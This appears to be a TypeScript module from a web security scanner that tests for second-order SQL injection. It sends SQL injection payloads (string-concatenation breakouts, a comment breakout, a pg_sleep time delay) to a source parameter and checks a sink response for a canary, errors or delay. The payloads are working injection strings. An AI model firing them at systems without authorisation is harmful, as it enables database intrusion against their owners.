import { CandidateParameter, SecondOrderWorkflowConfig } from '../../types/sqlScanner';
import { ParsedHttpRequest, RequestParser } from './RequestParser';

export interface SecondOrderResult {
  isVulnerable: boolean;
  canaryReflected: boolean;
  evidence: string;
  sourceRequest: string;
  sourceResponse: string;
  sinkRequest: string;
  sinkResponse: string;
}

export class SecondOrderTester {
  public static CANARY_PREFIX = 'SNT_SO_';

  /**
   * Dispatches a two-phase Source -> Sink Second-Order test
   */
  public static async executeSecondOrderTest(
    sourceParsed: ParsedHttpRequest,
    sourceParam: CandidateParameter,
    config: SecondOrderWorkflowConfig,
    sendRequestFn: (raw: string, url: string) => Promise<{ status: number; body: string; durationMs: number; rawRequest: string; rawResponse: string }>
  ): Promise<SecondOrderResult> {
    const token = `${SecondOrderTester.CANARY_PREFIX}${Date.now()}`;
    const context = sourceParam.detectedContext || 'single_quote_string';

    const payloads = [
      `'||'${token}'||'`,                     // ANSI / Oracle / Postgres concatenation
      `', CONCAT('${token}'), '`,            // MySQL CONCAT
      `'+'${token}'+'`,                      // MSSQL string addition
      `'-- -`,                               // Quote breakout comment
      `"||"${token}"||"`,                    // Double quote concatenation
      `' AND (SELECT pg_sleep(3)) IS NOT NULL--`, // Time delay second-order
    ];

    if (context === 'numeric' || /^\d+$/.test(sourceParam.originalValue.trim())) {
      payloads.unshift(` + 0`);
      payloads.unshift(`1337-1337`);
    }

    let lastSourceRes: any;
    let lastSinkRes: any;
    let isVulnerable = false;
    let canaryReflected = false;

    for (const payload of payloads) {
      // 1. Dispatch Source Injection Request
      const sourceInjected = RequestParser.injectPayload(sourceParsed, sourceParam, payload, true);
      lastSourceRes = await sendRequestFn(sourceInjected.rawRequest, sourceInjected.targetUrl);

      // 2. Dispatch Sink Retrieval Request
      const sinkRaw = config.sinkRawRequest || (sourceParsed.body ? sourceInjected.rawRequest : sourceParsed.body);
      const sinkUrl = config.sinkUrl || sourceParsed.url;
      lastSinkRes = await sendRequestFn(sinkRaw, sinkUrl);

      // 3. Evaluate if canary, error, or time delay is present in Sink response
      canaryReflected = lastSinkRes.body.includes(token);
      const errorInSink = lastSinkRes.status >= 500 || /syntax error|unclosed quotation|SQLstate/i.test(lastSinkRes.body);
      const timeDelayInSink = payload.includes('sleep') && lastSinkRes.durationMs >= 2500;

      if (canaryReflected || errorInSink || timeDelayInSink) {
        isVulnerable = true;
        break;
      }
    }

    const evidence = isVulnerable
      ? `Second-order SQL injection confirmed: Injected payload in source parameter "${sourceParam.name}" was stored and executed in sink response (${config.sinkUrl || sourceParsed.url})`
      : 'No second-order state reflection or error detected in sink response';

    return {
      isVulnerable,
      canaryReflected,
      evidence,
      sourceRequest: lastSourceRes?.rawRequest || '',
      sourceResponse: lastSourceRes?.rawResponse || '',
      sinkRequest: lastSinkRes?.rawRequest || '',
      sinkResponse: lastSinkRes?.rawResponse || '',
    };
  }
}
